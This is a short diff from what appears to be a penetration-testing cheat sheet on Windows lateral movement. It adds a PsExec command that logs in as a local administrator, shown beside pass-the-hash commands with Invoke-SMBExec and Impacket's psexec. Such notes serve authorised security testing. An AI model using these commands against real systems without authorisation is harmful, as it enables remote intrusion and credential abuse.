@@ -101,6 +101,7 @@ Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Has
 - Impacket: https://github.com/maaaaz/impacket-examples-windows
 ```
 .\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <PASSWORD> -i cmd.exe
+.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <COMPUTERNAME>\administrator -p <PASSWORD> -i cmd.exe
 .\PsExec64.exe \\<COMPUTERNAME> -accepteula 
 
 .\psexec_windows.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
